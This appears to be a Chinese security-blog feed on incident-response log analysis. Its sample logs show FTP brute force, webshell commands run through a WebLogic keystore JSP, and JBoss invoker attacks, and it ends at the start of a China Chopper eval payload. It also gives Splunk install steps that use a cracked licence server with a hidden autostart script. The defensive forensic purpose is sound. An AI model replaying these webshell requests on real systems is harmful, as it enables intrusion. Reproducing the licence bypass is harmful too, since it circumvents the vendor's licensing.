Password required <span class="keyword">for</span> admin</span><br><span class="line">(000134) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; USER admin</span><br><span class="line">(000134) 2024/2/29 12:44:49 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 331 Password required <span class="keyword">for</span> admin</span><br><span class="line">(000132) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; PASS **********</span><br><span class="line">(000130) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; PASS ****</span><br><span class="line">(000130) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 530 Login or password incorrect!</span><br><span class="line">(000132) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 530 Login or password incorrect!</span><br><span class="line">(000133) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; PASS ******</span><br><span class="line">(000131) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; PASS ****</span><br><span class="line">(000133) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 530 Login or password incorrect!</span><br><span class="line">(000135) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; PASS **************</span><br><span class="line">(000135) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 530 Login or password incorrect!</span><br><span class="line">(000131) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 530 Login or password incorrect!</span><br><span class="line">(000134) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; PASS *************</span><br><span class="line">(000134) 2024/2/29 12:44:59 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 530 Login or password incorrect!</span><br><span class="line">(000132) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 421 Login time exceeded. Closing control connection.</span><br><span class="line">(000132) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; disconnected.</span><br><span class="line">(000133) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 421 Login time exceeded. Closing control connection.</span><br><span class="line">(000133) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; disconnected.</span><br><span class="line">(000135) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 421 Login time exceeded. Closing control connection.</span><br><span class="line">(000135) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; disconnected.</span><br><span class="line">(000130) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 421 Login time exceeded. Closing control connection.</span><br><span class="line">(000130) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; disconnected.</span><br><span class="line">(000131) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; 421 Login time exceeded. Closing control connection.</span><br><span class="line">(000131) 2024/2/29 12:45:19 - (not logged <span class="keyword">in</span>) (192.168.126.135)&gt; disconnected.</span><br><span class="line">(000141) 2024/2/29 13:01:39 - admin (192.168.126.135)&gt; 229 Entering Extended Passive Mode (|||3637|)</span><br><span class="line">(000141) 2024/2/29 13:01:39 - admin (192.168.126.135)&gt; STOR system.php</span><br><span class="line">(000141) 2024/2/29 13:01:39 - admin (192.168.126.135)&gt; 150 Opening data channel <span class="keyword">for</span> file upload to server of <span class="string">&quot;/system.php&quot;</span></span><br><span class="line">(000141) 2024/2/29 13:01:39 - admin (192.168.126.135)&gt; 226 Successfully transferred <span class="string">&quot;/system.php&quot;</span></span><br></pre></td></tr></table></figure><h3 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h3><ol><li>access.log<ol><li>存放位置:<code>/WLS_HOME/userprojects/domains/base_domain/servers/servername/logs</code>(默认位置)</li><li>主要记录http请求，默认情况下日志记录处于启用状态，服务器将http请求保存在单独的日志文件中，日志格式如下，主要记录了http请求请求ip地址、请求时间、访问页面、响应状态等信息</li></ol></li><li><code>server.log</code><ol><li>存放位置:<code>/WLS_HOME/userprojects/domains/base_domain/servers/AdminServer/logs</code></li></ol></li><li>域日志<code>domain.log</code><ol><li>存放位置:<code>/WLS_HOME/userprojects/domains/base_domain/servers/AdminServer/logs</code></li></ol></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;POST /ws_utc/resources/setting/keystore?timestamp=1721198675696 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=id 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=id 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /favicon.ico 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=whoami 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=ls%20/opt 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=ls 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=cd%20config&amp;&amp;ls 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [17/Jul/2024:16:15:06 ] <span class="string">&quot;GET /ws_utc/css/config/keystore/1721199125414_1.jsp?pwd=023&amp;i=cd%20config&amp;ls 1.1&quot;</span> - -</span><br></pre></td></tr></table></figure><h3 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h3><ol><li>安装目录的<code>server/default/log</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.1 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;POST /admin-console/login.seam;jsessionid=3A26F47E59C27D51BCFA04901440A2B8 1.1&quot;</span> - -</span><br><span class="line">192.168.111.1 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;POST /admin-console/login.seam;jsessionid=3A26F47E59C27D51BCFA04901440A2B8 1.1&quot;</span> - -</span><br><span class="line">192.168.111.142 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;-&quot;</span> 302 262</span><br><span class="line">192.168.111.142 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;-&quot;</span> 302 262</span><br><span class="line">192.168.111.1 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;POST /invoker/readonly 1.1&quot;</span> - -</span><br><span class="line">192.168.111.142 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;-&quot;</span> 500 1561</span><br><span class="line">192.168.111.1 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;POST /invoker/readonly 1.1&quot;</span> - -</span><br><span class="line">192.168.111.142 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;-&quot;</span> 500 1561</span><br><span class="line">192.168.111.1 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;POST /invoker/readonly 1.1&quot;</span> - -</span><br><span class="line">192.168.111.142 - - [18/Jul/2024:20:41:36 ] <span class="string">&quot;-&quot;</span> 500 1561</span><br></pre></td></tr></table></figure><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>在Oracle数据库中，可以使用以下SQL查询来查看日志文件路径：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> v$logfile;</span><br><span class="line"><span class="comment">-- 显示日志文件的详细信息，包括文件名和路径。</span></span><br></pre></td></tr></table></figure><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>要查看MySQL是否启用了日志记录以及日志文件的位置，可以使用以下命令：</p><h4 id="检查是否启用日志"><a href="#检查是否启用日志" class="headerlink" title="检查是否启用日志"></a>检查是否启用日志</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;log_%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这将列出所有与日志相关的变量及其状态，通常包括以下几项：</p><ul><li><code>log_bin</code></li><li><code>log_error</code></li><li><code>log_output</code></li><li><code>log_queries_not_using_indexes</code></li><li><code>log_slave_updates</code></li><li><code>log_slow_admin_statements</code></li><li><code>log_slow_slave_statements</code></li><li><code>log_slow_rate_limit</code></li><li><code>log_timestamps</code></li></ul><h4 id="查看通用日志位置"><a href="#查看通用日志位置" class="headerlink" title="查看通用日志位置"></a>查看通用日志位置</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 检查是否启用了通用查询日志</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general_log&#x27;</span>;</span><br><span class="line"><span class="comment">-- 显示通用查询日志的文件路径</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general_log_file&#x27;</span>;</span><br></pre></td></tr></table></figure><p>默认情况下，MySQL的日志文件可能位于:<code>/var/log/mysql</code>.也可通过查看配置文件确定日志路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2021-08-09T03:05:39.193260Z 162 [Note] Access denied <span class="keyword">for</span> user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;192.168.23.206&#x27;</span> (using password: YES)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2021-08-09：日期，表示日志记录的日期是2021年8月9日。</span></span><br><span class="line"><span class="comment"># T：日期和时间的分隔符。</span></span><br><span class="line"><span class="comment"># 03:05:39.193260：时间，表示日志记录的时间是03:05:39.193260，精确到微秒。</span></span><br><span class="line"><span class="comment"># Z：表示时间是以UTC时间记录的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 162：连接ID，表示这是由ID为162的连接产生的日志。连接ID是MySQL分配给每个连接的唯一标识符。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [Note]：日志级别，表示这是一条注释信息。MySQL的日志级别通常包括ERROR、WARNING和NOTE。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Access denied for user &#x27;root&#x27;@&#x27;192.168.23.206&#x27;：错误消息，表示用户root尝试从IP地址192.168.23.206连接到MySQL服务器，但访问被拒绝。</span></span><br><span class="line"><span class="comment"># (using password: YES)：附加信息，表示该用户确实提供了密码，但认证失败。</span></span><br></pre></td></tr></table></figure><h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>使用<code>SQL Server Management Studio (SSMS)</code>查看<code>Microsoft SQL Server</code>的日志文件</p><ol><li>打开<code>SQL Server Management Studio (SSMS)</code></li><li>连接<code>SQL Server</code>实例。</li><li>在对象资源管理器中，展开<code>SQL Server</code>实例。</li><li>展开“管理”文件夹。</li><li>选择<code>SQL Server Logs</code>以查看日志文件。</li></ol><h2 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h2><p>日志分析是任何IT基础设施管理的关键组成部分。它可帮助了解系统运行情况、监控安全事件、遵守法规要求以及进行故障排除。以下是目前市场上两个非常流行的日志分析工具ELK（Elasticsearch, Logstash, Kibana）和Splunk的介绍、使用方法以及优劣势比较。</p><h3 id="ELK-Stack"><a href="#ELK-Stack" class="headerlink" title="ELK Stack"></a>ELK Stack</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>ELK是三个开源项目的组合：Elasticsearch、Logstash和Kibana。Elasticsearch是一个搜索和分析引擎，Logstash用于服务器端数据处理管道，它同时收集数据并在传输到Elasticsearch之前进行处理，Kibana则是数据可视化的前端组件。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><div class="tag-plugin link dis-select"><a class="link-card plain" title="从零搭建日志采集报警系统ELK" href="https://jiangjiyue.github.io/wiki/MonitoringTechDocs/%E5%9B%9B.%20%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86%E6%8A%A5%E8%AD%A6%E7%B3%BB%E7%BB%9FELK.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill=""><div class="left"><span class="title">从零搭建日志采集报警系统ELK</span><span class="cap link footnote">https://jiangjiyue.github.io/wiki/MonitoringTechDocs/%E5%9B%9B.%20%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86%E6%8A%A5%E8%AD%A6%E7%B3%BB%E7%BB%9FELK.html</span></div><div class="right"><div class="lazy img" data-bg="https://www.elastic.co/favicon.ico"></div></div></a></div><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>开源且免费（有收费的X-Pack扩展）。</li><li>高度可定制，可以根据需求安装插件。</li><li>社区支持强大。</li><li>良好的数据聚合能力。</li></ul><h4 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h4><ul><li>设置和维护相对困难，需要一定的技术知识。</li><li>性能可能受到大数据量影响。</li><li>高级功能需要支付额外费用。</li></ul><h3 id="Splunk"><a href="#Splunk" class="headerlink" title="Splunk"></a>Splunk</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>Splunk是一种商业日志管理和分析工具，提供实时数据监控、搜索、分析等功能。相比于ELK，Splunk是一个封闭源代码的产品，但它提供了强大的功能和易用性。</p><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><ol><li>双击setup.msc</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951953.png" data-fancybox="true"/></div></div><ol start="2"><li><p>勾选许可协议并自定义选项 </p><p>​<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951991.png" data-fancybox="true"/></div></div></p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951767.png" data-fancybox="true"/></div></div></li><li><p>点击<code>Next</code>选择第一个并下一步</p><ol><li><code>Local System</code> 只能通过127.0.0.1访问</li><li><code>Domain Account</code>可以通过域名或IP访问</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951665.png" data-fancybox="true"/></div></div></li><li><p>设置用户名及密码,不要有特殊字符</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951205.png" data-fancybox="true"/></div></div></li><li><p>点击<code>Install</code>等待安装完成,时间会长一些</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951611.png" data-fancybox="true"/></div></div></li><li><p>从浏览器访问<code>127.0.0.1:8000</code>输入安装时的账户密码即可登录</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951041.png" data-fancybox="true"/></div></div></li><li><p>登陆—&gt;右上角设置–&gt;授权</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952432.png" data-fancybox="true"/></div></div></li><li><p>选择更改为对等节点</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952133.png" data-fancybox="true"/></div></div></li><li><p>选择第二个</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952512.png" data-fancybox="true"/></div></div></li><li><p>解压压缩包中的<code>I_LOVE_DVT.rar</code>–&gt;<code>dvt-splunk_licsrv</code>–&gt;<code>windows</code>—&gt;选择对应的架构解压出来.双击打开</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952247.png" data-fancybox="true"/></div></div></li><li><p>复制连接到上方输入框中<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952558.png" data-fancybox="true"/></div></div></p></li><li><p>点击保存并重启服务器</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952399.png" data-fancybox="true"/></div></div></li></ol><mark class="tag-plugin colorful mark" color="red">每次使用splunk之前都需要打开dvt-splunk_licsrv.1.0.386.exe</mark><p>可以将下方内容保存为<code>bat</code>文件将此bat文件以及<code>dvt-splunk_licsrv.1.0.386.exe</code>都放在开机自启文件夹内,即可自动启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">REM 如果传入参数为 <span class="string">&quot;h&quot;</span>，则跳转到 :begin 标签</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%1&quot;</span>==<span class="string">&quot;h&quot;</span> goto begin</span><br><span class="line"></span><br><span class="line">REM 使用 mshta 和 VBScript 隐藏命令行窗口并以后台模式运行脚本</span><br><span class="line">start mshta vbscript:createobject(<span class="string">&quot;wscript.shell&quot;</span>).run(<span class="string">&quot;&quot;</span><span class="string">&quot;%~nx0&quot;</span><span class="string">&quot; h&quot;</span>,0)(window.close)&amp;&amp;<span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">:begin</span><br><span class="line"></span><br><span class="line">setlocal</span><br><span class="line"></span><br><span class="line">REM 检查 Splunkd 服务是否正在运行</span><br><span class="line">sc query Splunkd | findstr /C:<span class="string">&quot;STATE&quot;</span> | findstr /C:<span class="string">&quot;RUNNING&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel% neq 0 (</span><br><span class="line">    REM 如果服务未运行，则启动它</span><br><span class="line">    <span class="built_in">echo</span> Splunkd service is not running. Starting...</span><br><span class="line">    net start Splunkd</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    REM 如果服务正在运行，则输出相应信息</span><br><span class="line">    <span class="built_in">echo</span> Splunkd service is already running.</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">REM 检查端口 1337 是否没有被监听</span><br><span class="line">netstat -an | findstr /C:<span class="string">&quot;LISTENING&quot;</span> | findstr /C:<span class="string">&quot;1337&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel% neq 0 (</span><br><span class="line">    REM 如果端口未被监听，则启动 dvt-splunk_licsrv.1.0.386.exe</span><br><span class="line">    <span class="built_in">echo</span> Port 1337 is not being listened on. Starting dvt-splunk_licsrv.1.0.386.exe...</span><br><span class="line">    start /b <span class="string">&quot;&quot;</span> <span class="string">&quot;dvt-splunk_licsrv.1.0.386.exe&quot;</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    REM 如果端口已被监听，则输出相应信息</span><br><span class="line">    <span class="built_in">echo</span> Port 1337 is already being listened on.</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">endlocal</span><br></pre></td></tr></table></figure><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><div class="tag-plugin link dis-select"><a class="link-card plain" title="应急响应之Splunk" href="https://jiangjiyue.github.io/2024/07/07/4677b70c/" target="_blank" rel="external nofollow noopener noreferrer" cardlink autofill=""><div class="left"><span class="title">应急响应之Splunk</span><span class="cap link footnote">https://jiangjiyue.github.io/2024/07/07/4677b70c/</span></div><div class="right"><div class="lazy img" data-bg="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181954536.png"></div></div></a></div><h3 id="ELK-vs-Splunk"><a href="#ELK-vs-Splunk" class="headerlink" title="ELK vs Splunk"></a>ELK vs Splunk</h3><ul><li><strong>成本</strong>: ELK更适合预算有限或倾向于使用开源解决方案的组织，而Splunk则提供更全面的服务，但价格也相对较高。</li><li><strong>易用性</strong>: Splunk用户界面更直观，上手更快，适合初学者；而ELK可能需要更多的配置和调优。</li><li><strong>功能性</strong>: Splunk通常在功能性方面占优势，特别是在其提供的即时分析和即时反馈方面，而ELK则在数据处理和长期分析方面更灵活。</li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="服务器入侵取证"><a href="#服务器入侵取证" class="headerlink" title="服务器入侵取证"></a>服务器入侵取证</h3><p>描述：服务器被黑了，黑客留下了key，你能找到吗</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407190753075.png" data-fancybox="true"/></div></div><p>将近1000条数据,上传到<code>splunk</code>中进行分析</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407190753271.png" data-fancybox="true"/></div></div><p>我们可以看到他尝试文件读取my.cnf和passwd响应码为200很有可能读取成功了,我们去检查一下my.cnf当中有什么信息</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407190753283.png" data-fancybox="true"/></div></div><p>找到key了</p><h3 id="找到攻击者IP"><a href="#找到攻击者IP" class="headerlink" title="找到攻击者IP"></a>找到攻击者IP</h3><p>实验：网站入侵，找到攻击者ip</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407190753041.png" data-fancybox="true"/></div></div><p>45万条数据·····直接导入splunk</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407190753308.png" data-fancybox="true"/></div></div><p>先看一下POST相关的数据,并且对uri进行去重</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407190753968.png" data-fancybox="true"/></div></div><p>快速浏览,没什么东西使用语句<code>sourcetype=kk method=GET  | stats count by uri | sort + count</code>可以发现在暴力破解</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407190753086.png" data-fancybox="true"/></div></div><p>查看该事件IP</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407192242539.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="日志分析" scheme="https://jiangjiyue.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>应急响应之Webshell流量分析</title>
    <link href="https://jiangjiyue.github.io/2024/07/05/dd58c5ed/"/>
    <id>https://jiangjiyue.github.io/2024/07/05/dd58c5ed/</id>
    <published>2024-07-04T19:34:49.000Z</published>
    <updated>2024-11-01T04:47:06.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 29.74K </p>    </div>    <div class="cell" style="">    <p>代码: 22.58K, 文本: 2.37K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.81 小时</p>    </div>    </div><h2 id="常用的WebShell客户端"><a href="#常用的WebShell客户端" class="headerlink" title="常用的WebShell客户端"></a>常用的WebShell客户端</h2><ol><li>中国菜刀(使用量最大，适用范围最广的WebShell客户端)</li><li>蚁剑(一种常用的WebShell客户端)</li><li>冰蝎(自定义加密流量客户端)</li><li>哥斯拉</li><li>Weevely(kali中的加密客户端)</li></ol><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/JiangJiYue/SafeKiller_Docker"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=JiangJiYue&repo=SafeKiller_Docker&theme=dark&show_owner=true"/></a></div><h2 id="C刀"><a href="#C刀" class="headerlink" title="C刀"></a>C刀</h2><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210281051122.png" data-fancybox="true"/></div></div><h3 id="PHP类WebShell链接流量"><a href="#PHP类WebShell链接流量" class="headerlink" title="PHP类WebShell链接流量"></a>PHP类WebShell链接流量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">User-Agent: Java/1.8.0_181</span><br><span class="line">Host: 192.168.232.130</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-<span class="built_in">type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 735</span><br><span class="line"></span><br><span class="line">nima=@<span class="built_in">eval</span>.(base64_decode(<span 